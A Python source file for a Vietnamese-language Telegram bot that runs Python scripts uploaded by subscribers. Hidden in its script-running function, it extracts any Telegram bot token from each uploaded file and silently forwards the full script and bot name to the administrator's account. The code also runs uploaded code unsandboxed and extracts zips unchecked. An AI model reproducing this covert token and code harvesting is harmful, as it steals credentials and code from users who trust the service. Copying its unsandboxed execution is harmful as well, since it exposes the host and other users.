import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
from telebot import types
import time
from datetime import datetime, timedelta
import signal
import psutil
import sqlite3
import threading
import base64

TOKEN = os.getenv("TELEGRAM_TOKEN")  # Mã token của bot
ADMIN_ID = 6379209139  # ID quản trị viên
YOUR_USERNAME = '@HgAnh7'  # Tên người dùng với @

bot = telebot.TeleBot(TOKEN)

thu_muc_tai_len = 'bot_tai_len'
bot_scripts = {}
stored_tokens = {}
user_subscriptions = {}  
user_files = {}  
active_users = set()  

bot_khoa = False
che_do_mien_phi = False  

if not os.path.exists(thu_muc_tai_len):
    os.makedirs(thu_muc_tai_len)

def khoi_tao_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_files
                 (user_id INTEGER, file_name TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS active_users
                 (user_id INTEGER PRIMARY KEY)''')
    
    conn.commit()
    conn.close()

def tai_du_lieu():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM subscriptions')
    subscriptions = c.fetchall()
    for user_id, expiry in subscriptions:
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    c.execute('SELECT * FROM user_files')
    user_files_data = c.fetchall()
    for user_id, file_name in user_files_data:
        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
    
    c.execute('SELECT * FROM active_users')
    active_users_data = c.fetchall()
    for user_id, in active_users_data:
        active_users.add(user_id)
    
    conn.close()

def luu_thue_bao(user_id, expiry):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', 
              (user_id, expiry.isoformat()))
    conn.commit()
    conn.close()

def xoa_thue_bao_db(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def luu_tap_tin_nguoi_dung(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def xoa_tap_tin_nguoi_dung_db(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def them_nguoi_dung_hoat_dong(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def xoa_nguoi_dung_hoat_dong(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

khoi_tao_db()
tai_du_lieu()

def tao_menu_chinh(user_id):
    markup = types.InlineKeyboardMarkup()
    nut_tai_len = types.InlineKeyboardButton('📤 Tải Lên Tệp', callback_data='upload')
    nut_toc_do = types.InlineKeyboardButton('⚡ Tốc Độ Bot', callback_data='speed')
    nut_lien_he = types.InlineKeyboardButton('📞 Liên Hệ Chủ Sở Hữu', url=f'https://t.me/{YOUR_USERNAME[1:]}')
    if user_id == ADMIN_ID:
        nut_thue_bao = types.InlineKeyboardButton('💳 Thuê Bao', callback_data='subscription')
        nut_thong_ke = types.InlineKeyboardButton('📊 Thống Kê', callback_data='stats')
        nut_khoa_bot = types.InlineKeyboardButton('🔒 Khóa Bot', callback_data='lock_bot')
        nut_mo_khoa_bot = types.InlineKeyboardButton('🔓 Mở Khóa Bot', callback_data='unlock_bot')
        nut_che_do_mien_phi = types.InlineKeyboardButton('🔓 Chế Độ Miễn Phí', callback_data='free_mode')
        nut_phat_tin = types.InlineKeyboardButton('📢 Phát Tin', callback_data='broadcast')
        markup.add(nut_tai_len)
        markup.add(nut_toc_do, nut_thue_bao, nut_thong_ke)
        markup.add(nut_khoa_bot, nut_mo_khoa_bot, nut_che_do_mien_phi)
        markup.add(nut_phat_tin)
    else:
        markup.add(nut_tai_len)
        markup.add(nut_toc_do)
    markup.add(nut_lien_he)
    return markup

@bot.message_handler(commands=['start'])
def gui_loi_chao(message):
    if bot_khoa:
        bot.send_message(message.chat.id, "⚠️ Bot hiện đang bị khóa. Vui lòng thử lại sau.")
        return

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_username = message.from_user.username

    try:
        user_profile = bot.get_chat(user_id)
        user_bio = user_profile.bio if user_profile.bio else "Không có tiểu sử"
    except Exception as e:
        print(f"❌ Không thể lấy tiểu sử: {e}")
        user_bio = "Không có tiểu sử"

    try:
        user_profile_photos = bot.get_user_profile_photos(user_id, limit=1)
        if user_profile_photos.photos:
            photo_file_id = user_profile_photos.photos[0][-1].file_id  
        else:
            photo_file_id = None
    except Exception as e:
        print(f"❌ Không thể lấy ảnh người dùng: {e}")
        photo_file_id = None

    if user_id not in active_users:
        active_users.add(user_id)  
        them_nguoi_dung_hoat_dong(user_id)  

        try:
            thong_bao_chao_admin = f"🎉 Người dùng mới tham gia bot!\n\n"
            thong_bao_chao_admin += f"👤 Tên: {user_name}\n"
            thong_bao_chao_admin += f"📌 Tên người dùng: @{user_username}\n"
            thong_bao_chao_admin += f"🆔 ID: {user_id}\n"
            thong_bao_chao_admin += f"📝 Tiểu sử: {user_bio}\n"

            if photo_file_id:
                bot.send_photo(ADMIN_ID, photo_file_id, caption=thong_bao_chao_admin)
            else:
                bot.send_message(ADMIN_ID, thong_bao_chao_admin)
        except Exception as e:
            print(f"❌ Không thể gửi thông tin người dùng đến quản trị viên: {e}")

    thong_bao_chao = f"〽️┇Chào mừng: {user_name}\n"
    thong_bao_chao += f"🆔┇ID của bạn: {user_id}\n"
    thong_bao_chao += f"♻️┇Tên người dùng: @{user_username}\n"
    thong_bao_chao += f"📰┇Tiểu sử: {user_bio}\n\n"
    thong_bao_chao += "〽️ Tôi là bot lưu trữ tệp Python 🎗 Bạn có thể sử dụng các nút bên dưới để điều khiển ♻️"

    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=thong_bao_chao, reply_markup=tao_menu_chinh(user_id))
    else:
        bot.send_message(message.chat.id, thong_bao_chao, reply_markup=tao_menu_chinh(user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def phat_tin_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Gửi tin nhắn bạn muốn phát đi:")
        bot.register_next_step_handler(call.message, xu_ly_tin_nhan_phat)
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

def xu_ly_tin_nhan_phat(message):
    if message.from_user.id == ADMIN_ID:
        tin_nhan_phat = message.text
        so_luong_thanh_cong = 0
        so_luong_that_bai = 0

        for user_id in active_users:
            try:
                bot.send_message(user_id, tin_nhan_phat)
                so_luong_thanh_cong += 1
            except Exception as e:
                print(f"❌ Không thể gửi tin nhắn đến người dùng {user_id}: {e}")
                so_luong_that_bai += 1

        bot.send_message(message.chat.id, f"✅ Tin nhắn đã được gửi đến {so_luong_thanh_cong} người dùng.\n❌ Không thể gửi đến {so_luong_that_bai} người dùng.")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def thong_tin_toc_do_bot(call):
    try:
        thoi_gian_bat_dau = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        do_tre = time.time() - thoi_gian_bat_dau
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ Tốc độ bot: {do_tre:.2f} giây.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ Không thể lấy tốc độ bot.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Lỗi khi kiểm tra tốc độ bot: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def yeu_cau_tai_len_tap_tin(call):
    user_id = call.from_user.id
    if bot_khoa:
        bot.send_message(call.message.chat.id, f"⚠️ Bot hiện đang bị khóa. Vui lòng liên hệ nhà phát triển {YOUR_USERNAME}.")
        return
    if che_do_mien_phi or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        bot.send_message(call.message.chat.id, "📄 Vui lòng gửi tệp bạn muốn tải lên.")
    else:
        bot.send_message(call.message.chat.id, f"⚠️ Bạn cần đăng ký thuê bao để sử dụng tính năng này. Vui lòng liên hệ nhà phát triển {YOUR_USERNAME}")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def menu_thue_bao(call):
    if call.from_user.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        nut_them_thue_bao = types.InlineKeyboardButton('➕ Thêm Thuê Bao', callback_data='add_subscription')
        nut_xoa_thue_bao = types.InlineKeyboardButton('➖ Xóa Thuê Bao', callback_data='remove_subscription')
        markup.add(nut_them_thue_bao, nut_xoa_thue_bao)
        bot.send_message(call.message.chat.id, "Chọn hành động bạn muốn thực hiện:", reply_markup=markup)
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def menu_thong_ke(call):
    if call.from_user.id == ADMIN_ID:
        tong_so_tap_tin = sum(len(files) for files in user_files.values())
        tong_so_nguoi_dung = len(user_files)
        so_nguoi_dung_hoat_dong = len(active_users)
        bot.send_message(call.message.chat.id, f"📊 Thống kê:\n\n📂 Tệp đã tải lên: {tong_so_tap_tin}\n👤 Tổng số người dùng: {tong_so_nguoi_dung}\n👥 Người dùng hoạt động: {so_nguoi_dung_hoat_dong}")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'add_subscription')
def them_thue_bao_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Gửi ID người dùng và số ngày theo định dạng:\n/add_subscription <user_id> <days>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'remove_subscription')
def xoa_thue_bao_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Gửi ID người dùng theo định dạng:\n/remove_subscription <user_id>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['add_subscription'])
def them_thue_bao(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            days = int(message.text.split()[2])
            ngay_het_han = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': ngay_het_han}
            luu_thue_bao(user_id, ngay_het_han)
            bot.send_message(message.chat.id, f"✅ Đã thêm thuê bao {days} ngày cho người dùng {user_id}.")
            bot.send_message(user_id, f"🎉 Thuê bao của bạn đã được kích hoạt trong {days} ngày. Bạn có thể sử dụng bot ngay bây giờ!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['remove_subscription'])
def xoa_thue_bao(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                xoa_thue_bao_db(user_id)
                bot.send_message(message.chat.id, f"✅ Đã xóa thuê bao của người dùng {user_id}.")
                bot.send_message(user_id, "⚠️ Thuê bao của bạn đã bị xóa. Bạn không thể sử dụng bot nữa.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} không có thuê bao.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['user_files'])
def hien_thi_tap_tin_nguoi_dung(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in user_files:
                danh_sach_tap_tin = "\n".join(user_files[user_id])
                bot.send_message(message.chat.id, f"📂 Tệp đã tải lên bởi người dùng {user_id}:\n{danh_sach_tap_tin}")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} chưa tải lên tệp nào.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['lock'])
def khoa_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_khoa
        bot_khoa = True
        bot.send_message(message.chat.id, "🔒 Bot đã bị khóa.")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['unlock'])
def mo_khoa_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_khoa
        bot_khoa = False
        bot.send_message(message.chat.id, "🔓 Bot đã được mở khóa.")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'lock_bot')
def khoa_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_khoa
        bot_khoa = True
        bot.send_message(call.message.chat.id, "🔒 Bot đã bị khóa.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'unlock_bot')
def mo_khoa_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_khoa
        bot_khoa = False
        bot.send_message(call.message.chat.id, "🔓 Bot đã được mở khóa.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.callback_query_handler(func=lambda call: call.data == 'free_mode')
def bat_tat_che_do_mien_phi(call):
    if call.from_user.id == ADMIN_ID:
        global che_do_mien_phi
        che_do_mien_phi = not che_do_mien_phi
        trang_thai = "mở" if che_do_mien_phi else "đóng"
        bot.send_message(call.message.chat.id, f"🔓 Chế độ miễn phí hiện đang: {trang_thai}.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(content_types=['document'])
def xu_ly_tap_tin(message):
    user_id = message.from_user.id
    if bot_khoa:
        bot.reply_to(message, f"⚠️ Bot hiện đang bị khóa. Vui lòng liên hệ nhà phát triển {YOUR_USERNAME}")
        return
    if che_do_mien_phi or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name

            if not file_name.endswith('.py') and not file_name.endswith('.zip'):
                bot.reply_to(message, "⚠️ Bot chỉ chấp nhận tệp Python (.py) hoặc tệp nén zip.")
                return

            if file_name.endswith('.zip'):
                with tempfile.TemporaryDirectory() as temp_dir:
                    thu_muc_zip = os.path.join(temp_dir, file_name.split('.')[0])

                    duong_dan_zip = os.path.join(temp_dir, file_name)
                    with open(duong_dan_zip, 'wb') as new_file:
                        new_file.write(downloaded_file)
                    with zipfile.ZipFile(duong_dan_zip, 'r') as zip_ref:
                        zip_ref.extractall(thu_muc_zip)

                    duong_dan_thu_muc_cuoi = os.path.join(thu_muc_tai_len, file_name.split('.')[0])
                    if not os.path.exists(duong_dan_thu_muc_cuoi):
                        os.makedirs(duong_dan_thu_muc_cuoi)

                    for root, dirs, files in os.walk(thu_muc_zip):
                        for file in files:
                            tep_nguon = os.path.join(root, file)
                            tep_dich = os.path.join(duong_dan_thu_muc_cuoi, file)
                            shutil.move(tep_nguon, tep_dich)

                    tep_py = [f for f in os.listdir(duong_dan_thu_muc_cuoi) if f.endswith('.py')]
                    if tep_py:
                        kich_ban_chinh = tep_py[0]  
                        chay_kich_ban(os.path.join(duong_dan_thu_muc_cuoi, kich_ban_chinh), message.chat.id, duong_dan_thu_muc_cuoi, kich_ban_chinh, message)
                    else:
                        bot.send_message(message.chat.id, f"❌ Không tìm thấy tệp Python (.py) trong kho lưu trữ.")
                        return

            else:
                duong_dan_kich_ban = os.path.join(thu_muc_tai_len, file_name)
                with open(duong_dan_kich_ban, 'wb') as new_file:
                    new_file.write(downloaded_file)

                chay_kich_ban(duong_dan_kich_ban, message.chat.id, thu_muc_tai_len, file_name, message)

            if user_id not in user_files:
                user_files[user_id] = []
            user_files[user_id].append(file_name)
            luu_tap_tin_nguoi_dung(user_id, file_name)

        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi: {e}")
    else:
        bot.reply_to(message, f"⚠️ Bạn cần đăng ký thuê bao để sử dụng tính năng này. Vui lòng liên hệ nhà phát triển {YOUR_USERNAME}")

def chay_kich_ban(duong_dan_kich_ban, chat_id, duong_dan_thu_muc, ten_tap_tin, tin_nhan_goc):
    try:
        duong_dan_yeu_cau = os.path.join(os.path.dirname(duong_dan_kich_ban), 'requirements.txt')
        if os.path.exists(duong_dan_yeu_cau):
            bot.send_message(chat_id, "🔄 Đang cài đặt các yêu cầu...")
            subprocess.check_call(['pip', 'install', '-r', duong_dan_yeu_cau])

        bot.send_message(chat_id, f"🚀 Đang chạy bot {ten_tap_tin}...")
        tien_trinh = subprocess.Popen(['python3', duong_dan_kich_ban], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': tien_trinh, 'folder_path': duong_dan_thu_muc}

        token = trich_xuat_token_tu_kich_ban(duong_dan_kich_ban)
        thong_tin_nguoi_dung = f"@{tin_nhan_goc.from_user.username}" if tin_nhan_goc.from_user.username else str(tin_nhan_goc.from_user.id)
        
        if token:
            try:
                thong_tin_bot = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                ten_bot = thong_tin_bot['result']['username']
                chu_thich = f"📤 Người dùng {thong_tin_nguoi_dung} đã tải lên tệp bot mới. Tên bot: @{ten_bot}"
            except:
                chu_thich = f"📤 Người dùng {thong_tin_nguoi_dung} đã tải lên tệp bot mới, nhưng không thể lấy tên bot."
        else:
            chu_thich = f"📤 Người dùng {thong_tin_nguoi_dung} đã tải lên tệp bot mới, nhưng không tìm thấy token."

        bot.send_document(ADMIN_ID, open(duong_dan_kich_ban, 'rb'), caption=chu_thich)

        markup = types.InlineKeyboardMarkup()
        nut_dung = types.InlineKeyboardButton(f"🔴 Dừng {ten_tap_tin}", callback_data=f'stop_{chat_id}_{ten_tap_tin}')
        nut_xoa = types.InlineKeyboardButton(f"🗑️ Xóa {ten_tap_tin}", callback_data=f'delete_{chat_id}_{ten_tap_tin}')
        markup.add(nut_dung, nut_xoa)
        bot.send_message(chat_id, f"Sử dụng các nút bên dưới để điều khiển bot 👇", reply_markup=markup)

    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy bot: {e}")

def trich_xuat_token_tu_kich_ban(duong_dan_kich_ban):
    try:
        with open(duong_dan_kich_ban, 'r') as tap_tin_kich_ban:
            noi_dung_tap_tin = tap_tin_kich_ban.read()

            token_trung_khop = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", noi_dung_tap_tin)
            if token_trung_khop:
                return token_trung_khop.group(1)
            else:
                print(f"[CẢNH BÁO] Không tìm thấy token trong {duong_dan_kich_ban}")
    except Exception as e:
        print(f"[LỖI] Không thể trích xuất token từ {duong_dan_kich_ban}: {e}")
    return None

def lay_tap_tin_tuy_chinh_de_chay(message):
    try:
        chat_id = message.chat.id
        duong_dan_thu_muc = bot_scripts[chat_id]['folder_path']
        duong_dan_tap_tin_tuy_chinh = os.path.join(duong_dan_thu_muc, message.text)

        if os.path.exists(duong_dan_tap_tin_tuy_chinh):
            chay_kich_ban(duong_dan_tap_tin_tuy_chinh, chat_id, duong_dan_thu_muc, message.text, message)
        else:
            bot.send_message(chat_id, f"❌ Tệp được chỉ định không tồn tại. Vui lòng kiểm tra tên và thử lại.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi: {e}")

@bot.callback_query_handler(func=lambda call: True)
def xu_ly_yeu_cau_callback(call):
    if call.data.startswith('stop_'):
        chat_id = int(call.data.split('_')[1])
        dung_bot_dang_chay(chat_id)
    elif call.data.startswith('delete_'):
        chat_id = int(call.data.split('_')[1])
        xoa_tap_tin_tai_len(chat_id)

def dung_bot_dang_chay(chat_id):
    if chat_id in bot_scripts and 'process' in bot_scripts[chat_id]:
        huy_tien_trinh_cay(bot_scripts[chat_id]['process'])
        bot.send_message(chat_id, "🔴 Bot đã dừng.")
    else:
        bot.send_message(chat_id, "⚠️ Hiện không có bot nào đang chạy.")

def xoa_tap_tin_tai_len(chat_id):
    if chat_id in bot_scripts and 'folder_path' in bot_scripts[chat_id]:
        duong_dan_thu_muc = bot_scripts[chat_id]['folder_path']
        if os.path.exists(duong_dan_thu_muc):
            shutil.rmtree(duong_dan_thu_muc)
            bot.send_message(chat_id, f"🗑️ Tệp bot đã bị xóa.")
        else:
            bot.send_message(chat_id, "⚠️ Tệp không tồn tại.")
    else:
        bot.send_message(chat_id, "⚠️ Không có tệp bot nào để xóa.")

def huy_tien_trinh_cay(tien_trinh):
    try:
        cha = psutil.Process(tien_trinh.pid)
        con = cha.children(recursive=True)
        for con_hang in con:
            con_hang.kill()
        cha.kill()
    except Exception as e:
        print(f"❌ Không thể hủy tiến trình: {e}")

@bot.message_handler(commands=['delete_user_file'])
def xoa_tap_tin_nguoi_dung(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            ten_tap_tin = message.text.split()[2]
            
            if user_id in user_files and ten_tap_tin in user_files[user_id]:
                duong_dan_tap_tin = os.path.join(thu_muc_tai_len, ten_tap_tin)
                if os.path.exists(duong_dan_tap_tin):
                    os.remove(duong_dan_tap_tin)
                    user_files[user_id].remove(ten_tap_tin)
                    xoa_tap_tin_nguoi_dung_db(user_id, ten_tap_tin)
                    bot.send_message(message.chat.id, f"✅ Đã xóa tệp {ten_tap_tin} của người dùng {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"⚠️ Tệp {ten_tap_tin} không tồn tại.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} chưa tải lên tệp {ten_tap_tin}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

@bot.message_handler(commands=['stop_user_bot'])
def dung_bot_nguoi_dung(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            ten_tap_tin = message.text.split()[2]
            
            if user_id in user_files and ten_tap_tin in user_files[user_id]:
                for chat_id, thong_tin_kich_ban in bot_scripts.items():
                    if thong_tin_kich_ban.get('folder_path', '').endswith(ten_tap_tin.split('.')[0]):
                        huy_tien_trinh_cay(thong_tin_kich_ban['process'])
                        bot.send_message(chat_id, f"🔴 Đã dừng bot {ten_tap_tin}.")
                        bot.send_message(message.chat.id, f"✅ Đã dừng bot {ten_tap_tin} của người dùng {user_id}.")
                        break
                else:
                    bot.send_message(message.chat.id, f"⚠️ Bot {ten_tap_tin} không đang chạy.")
            else:
                bot.send_message(message.chat.id, f"⚠️ Người dùng {user_id} chưa tải lên tệp {ten_tap_tin}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Lỗi: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ Bạn không phải là nhà phát triển.")

bot.infinity_polling()